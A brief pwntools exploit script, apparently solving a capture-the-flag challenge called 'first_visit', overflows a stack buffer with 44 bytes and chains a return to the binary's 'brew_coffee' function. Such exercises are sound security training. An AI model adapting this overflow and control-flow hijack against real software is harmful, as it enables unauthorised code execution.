from pwn import *
exe = context.binary = ELF("./first_visit")
r = process()
offset = 44
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(exe.sym['brew_coffee'])
rop.raw(exe.sym['main'])
r.sendline(rop.chain())
r.interactive()